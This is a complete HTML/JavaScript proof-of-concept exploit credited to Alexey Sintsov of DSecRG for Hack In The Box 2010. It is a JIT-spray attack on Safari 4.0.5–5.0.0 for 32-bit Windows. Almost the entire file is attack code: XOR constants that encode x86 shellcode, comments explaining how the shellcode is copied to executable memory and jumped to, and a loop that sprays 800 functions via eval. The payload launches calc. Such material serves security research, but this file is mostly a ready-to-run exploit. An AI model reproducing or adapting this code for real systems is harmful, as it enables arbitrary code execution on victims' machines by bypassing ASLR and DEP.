<!--
JIT-SPRAY for Safari 4.0.5 - 5.0.0
 
JavaScript JIT SHELLCODE and spray
             for
         ASLR / DEP bypass (Win x32)
          
By Alexey Sintsov
   from Digital Security Research Group
 
Special for Hack In The Box 2010 Amsterdam
 
 
PAYLOAD - exec calc
Tested on Windows7 and Windows XP. (Sorry - have not Mac yet)
  
 
 
 - How it works?
 
 - Answer here:
 http://dsecrg.com/pages/pub/show.php?id=26
 
 
[DSecRG]
www.dsecrg.com
 
-->
<script>
 
 
var SPRAY="";
 
var JIT="{ "+
"var y=("+
"0x22222222^"+ /* START OF OFFSET */
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+ /*we don't wanna NULLS in pointer*/
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+ /*SHELLCODE BEGINS*/
 
"0x14ebc031^"+ // xor eax,eax  <------------------ EIP=0xXXYY0104
"0x14eb27b4^"+ // mov ah, 27    ; HC - CHANGE THIS, if u want to write SC to another page
"0x14eb35b0^"+ // mov al, 35    ; HC - ------^
"0x14ebe0f7^"+ // mul eax
"0x14eb00b0^"+ // mov al, 00
"0x14eb00b4^"+ // now EAX = 06010000 - RWX memory pointer for shellcode
"0x14ebc88b^"+ // mov ecx, eax ; now ECX is pointer on RWX mem
 
"0x14ebdb33^"+ // xor ebx, ebx
"0x14eb04b3^"+ // mov bl, 4    ; EBX = 0x4 - step to pointer
               
"0x14ebc031^"+ // xor eax,eax
"0x14eb0bb4^"+ // mov ah, 0b
"0x14ebb5b0^"+ // mov al, fc
"0x14ebe0f7^"+ // mul eax    ;EAX = 0089xxyy
"0x14ebe8b4^"+ // mov ah, e8
"0x14ebfcb0^"+ // mov al, fc ; EAX=0089E8FC - value of shellcode
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
"0x14ebc031^"+ // xor eax,eax
"0x14ebbbb4^"+ // mov ah, bb
"0x14eb88b0^"+ // mov al, 88
"0x14ebe0f7^"+ // mul eax  ; EAX = 8959xxyy
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax  ; EAX = 89600000
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
"0x14ebc031^"+ // xor eax,eax
"0x14eba0b4^"+ // mov ah, a0
"0x14eba8b0^"+ // mov al, a8
"0x14ebe0f7^"+ // EAX = 64D2xxyy
"0x14eb31b4^"+ // mov ah, 31
"0x14ebe5b0^"+ // mov al, e5 ; EAX = 64D231E5
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebc4b0^"+ // mov al, c4
"0x14ebe0f7^"+ // EAX = 8B300000
"0x14eb52b4^"+ // mov ah, 52
"0x14eb8bb0^"+ // mov al, 8b ;
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb91b4^"+ // mov ah, 91
"0x14eb5eb0^"+ // mov al, 5e
"0x14ebe0f7^"+ // EAX = 528B0000
"0x14eb0cb4^"+ // mov ah, 0c
"0x14eb52b0^"+ // mov al, 52
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb65b4^"+ // mov ah, 65
"0x14ebc2b0^"+ // mov al, c2
"0x14ebe0f7^"+ // EAX = 28720000
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb14b0^"+ // mov al, 14
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb63b4^"+ // mov ah, 63
"0x14eb02b0^"+ // mov al, 02
"0x14ebe0f7^"+ // EAX
"0x14ebb7b4^"+ // mov ah, b7
"0x14eb0fb0^"+ // mov al, 0f
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebddb4^"+ // mov ah, dd
"0x14ebd0b0^"+ // mov al, d0
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebffb4^"+ // mov ah, b7
"0x14eb31b0^"+ // mov al, 0f
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb2b4^"+ // mov ah, b2
"0x14eb71b0^"+ // mov al, 71
"0x14ebe0f7^"+ // EAX
"0x14eb3cb4^"+ // mov ah, 3c
"0x14ebacb0^"+ // mov al, ac
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebdeb4^"+ // mov ah, de
"0x14eb5ab0^"+ // mov al, 5a
"0x14ebe0f7^"+ // EAX
"0x14eb2cb4^"+ // mov ah, 2c
"0x14eb02b0^"+ // mov al, 02
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe1b4^"+ // mov ah, e1
"0x14ebb6b0^"+ // mov al, b6
"0x14ebe0f7^"+ // EAX
"0x14eb0db4^"+ // mov ah, 0d
"0x14ebcfb0^"+ // mov al, cf
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb95b4^"+ // mov ah, 95
"0x14eb84b0^"+ // mov al, 84
"0x14ebe0f7^"+ // EAX
"0x14ebf0b4^"+ // mov ah, f0
"0x14ebe2b0^"+ // mov al, e2
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebaeb0^"+ // mov al, ae
"0x14ebe0f7^"+ // EAX
"0x14eb52b4^"+ // mov ah, 52
"0x14eb8bb0^"+ // mov al, 8b
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe6b4^"+ // mov ah, e6
"0x14ebc2b0^"+ // mov al, c2
"0x14ebe0f7^"+ // EAX
"0x14eb3cb4^"+ // mov ah, 3c
"0x14eb42b0^"+ // mov al, 42
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb8b4^"+ // mov ah, b8
"0x14ebd9b0^"+ // mov al, d9
"0x14ebe0f7^"+ // EAX
"0x14eb40b4^"+ // mov ah, 40
"0x14eb8bb0^"+ // mov al, 8b
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb12b4^"+ // mov ah, 12
"0x14eb2bb0^"+ // mov al, 2b
"0x14ebe0f7^"+ // EAX
"0x14eb74b4^"+ // mov ah, 74
"0x14ebc0b0^"+ // mov al, c0
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb88b4^"+ // mov ah, 88
"0x14eb47b0^"+ // mov al, 47
"0x14ebe0f7^"+ // EAX
"0x14eb50b4^"+ // mov ah, 50
"0x14ebd0b0^"+ // mov al, d0
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb5ab4^"+ // mov ah, 5a
"0x14ebffb0^"+ // mov al, ff
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb18b0^"+ // mov al, 18
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb7cb4^"+ // mov ah, 7c
"0x14ebdab0^"+ // mov al, da
"0x14ebe0f7^"+ // EAX
"0x14ebd3b4^"+ // mov ah, d3
"0x14eb01b0^"+ // mov al, 01
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebc7b0^"+ // mov al, c7
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb49b0^"+ // mov al, 49
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebffb4^"+ // mov ah, ff
"0x14eb98b0^"+ // mov al, 98
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebd6b4^"+ // mov ah, d6
"0x14eb01b0^"+ // mov al, 01
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebdeb4^"+ // mov ah, de
"0x14ebaab0^"+ // mov al, aa
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebc0b4^"+ // mov ah, c0
"0x14eb31b0^"+ // mov al, 31
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe1b4^"+ // mov ah, e1
"0x14ebb6b0^"+ // mov al, b6
"0x14ebe0f7^"+ // EAX
"0x14eb0db4^"+ // mov ah, 0d
"0x14ebcfb0^"+ // mov al, cf
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebfab4^"+ // mov ah, fa
"0x14eb29b0^"+ // mov al, 29
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebe0b4^"+ // mov ah, e0
"0x14eb38b0^"+ // mov al, 38
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb7bb4^"+ // mov ah, 7b
"0x14ebe8b0^"+ // mov al, e8
"0x14ebe0f7^"+ // EAX
"0x14eb7db4^"+ // mov ah, 7d
"0x14eb03b0^"+ // mov al, 03
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebf0b4^"+ // mov ah, f0
"0x14ebc7b0^"+ // mov al, c7
"0x14ebe0f7^"+ // EAX
"0x14eb24b4^"+ // mov ah, 24
"0x14eb7db0^"+ // mov al, 7d
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb60b4^"+ // mov ah, 60
"0x14eb76b0^"+ // mov al, 76
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb58b0^"+ // mov al, 58
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebe8b0^"+ // mov al, e8
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebd3b4^"+ // mov ah, d3
"0x14eb01b0^"+ // mov al, 01
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb96b4^"+ // mov ah, 96
"0x14eb8fb0^"+ // mov al, 8f
"0x14ebe0f7^"+ // EAX
"0x14eb4bb4^"+ // mov ah, 4b
"0x14eb0cb0^"+ // mov al, 0c
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbdb4^"+ // mov ah, bd
"0x14eb32b0^"+ // mov al, 32
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb01b4^"+ // mov ah, 01
"0x14eb1cb0^"+ // mov al, 1c
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebe6b4^"+ // mov ah, e6
"0x14ebc2b0^"+ // mov al, c2
"0x14ebe0f7^"+ // EAX
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb04b0^"+ // mov al, 04
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb60b4^"+ // mov ah, 60
"0x14eb30b0^"+ // mov al, 30
"0x14ebe0f7^"+ // EAX
"0x14eb44b4^"+ // mov ah, 44
"0x14eb89b0^"+ // mov al, 89
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb97b4^"+ // mov ah, 97
"0x14eb44b0^"+ // mov al, 44
"0x14ebe0f7^"+ // EAX
"0x14eb5bb4^"+ // mov ah, 5b
"0x14eb5bb0^"+ // mov al, 5b
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebefb4^"+ // mov ah, ef
"0x14ebffb0^"+ // mov al, ff
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb51b4^"+ // mov ah, 51
"0x14eb5ab0^"+ // mov al, 5a
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebe0b0^"+ // mov al, e0
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb5fb4^"+ // mov ah, 5f
"0x14eb58b0^"+ // mov al, 58
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb9ab4^"+ // mov ah, 9a
"0x14ebbcb0^"+ // mov al, bc
"0x14ebe0f7^"+ // EAX
"0x14ebebb4^"+ // mov ah, eb
"0x14eb12b0^"+ // mov al, 12
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb8b4^"+ // mov ah, b8
"0x14ebe7b0^"+ // mov al, e7
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14eb01b4^"+ // mov ah, 01
"0x14eb6ab0^"+ // mov al, 6a
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebb9b0^"+ // mov al, b9
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebc5b0^"+ // mov al, c5
"0x14ebe0f7^"+ // EAX
"0x14eb68b4^"+ // mov ah, 68
"0x14eb50b0^"+ // mov al, 50
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebeab4^"+ // mov ah, ea
"0x14eb0fb0^"+ // mov al, 0f
"0x14ebe0f7^"+ // EAX
"0x14eb87b4^"+ // mov ah, 87
"0x14eb6fb0^"+ // mov al, 6f
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebccb4^"+ // mov ah, cc
"0x14eb17b0^"+ // mov al, 17
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax
"0x14ebf0b4^"+ // mov ah, f0
"0x14ebbbb0^"+ // mov al, bb
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebc3b4^"+ // mov ah, c3
"0x14ebbbb0^"+ // mov al, bb
"0x14ebe0f7^"+ // EAX
"0x14eb68b4^"+ // mov ah, 68
"0x14eb56b0^"+ // mov al, 56
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebeab4^"+ // mov ah, ea
"0x14eb0fb0^"+ // mov al, 0f
"0x14ebe0f7^"+ // EAX
"0x14eb9db4^"+ // mov ah, 9d
"0x14ebbdb0^"+ // mov al, bd
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb33b4^"+ // mov ah, 33
"0x14ebcfb0^"+ // mov al, cf
"0x14ebe0f7^"+ // EAX
"0x14eb06b4^"+ // mov ah, 06
"0x14eb3cb0^"+ // mov al, 3c
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebadb4^"+ // mov ah, ad
"0x14ebb7b0^"+ // mov al, b7
"0x14ebe0f7^"+ // EAX
"0x14ebfbb4^"+ // mov ah, fb
"0x14eb80b0^"+ // mov al, 80
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb46b4^"+ // mov ah, 46
"0x14eb40b0^"+ // mov al, 40
"0x14ebe0f7^"+ // EAX
"0x14ebbbb4^"+ // mov ah, bb
"0x14eb05b0^"+ // mov al, 05
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb0ab4^"+ // mov ah, 0a
"0x14eb4cb0^"+ // mov al, 4c
"0x14ebe0f7^"+ // EAX
"0x14eb6fb4^"+ // mov ah, 6f
"0x14eb72b0^"+ // mov al, 72
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb9fb4^"+ // mov ah, 9f
"0x14ebdeb0^"+ // mov al, de
"0x14ebe0f7^"+ // EAX
"0x14ebffb4^"+ // mov ah, ff
"0x14eb53b0^"+ // mov al, 53
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb09b4^"+ // mov ah, 09
"0x14ebf4b0^"+ // mov al, f4
"0x14ebe0f7^"+ // EAX
"0x14eb6cb4^"+ // mov ah, 6c
"0x14eb61b0^"+ // mov al, 61
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
 
"0x14eb00b5^"+ // mov ch, 00
"0x14eb00b1^"+ // mov cl, 00 ; ECX = 06010000 ; RWE memory WITH shellcode
"0x14ebe1ff^"+ // JMP ECX ; PROFIT !
 
"0x14ebcccc"+
");"+
"return y; }";
 
 
var zl="zlo_";
     
for (var i=1;i<800;i++)
{
    SPRAY+="function "+zl+i+"()"+JIT+" "+zl+i+"();";
}
 
eval(SPRAY);
 
</script>